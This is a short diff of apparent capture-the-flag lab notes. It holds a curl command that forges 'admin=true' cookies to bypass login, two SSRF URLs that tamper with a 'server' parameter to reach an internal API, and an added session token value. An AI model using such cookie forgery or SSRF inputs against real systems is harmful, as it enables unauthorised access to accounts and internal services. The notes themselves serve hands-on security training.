@@ -24,3 +24,5 @@ curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
 #SSRF
 http://website.thm/stock?server=api&id=qwe
 http://website.thm/stock?server=api.website.thm/api/user&x&id=123
+
+session=9392c12a40773afcedfd7f2ee0f3de3f
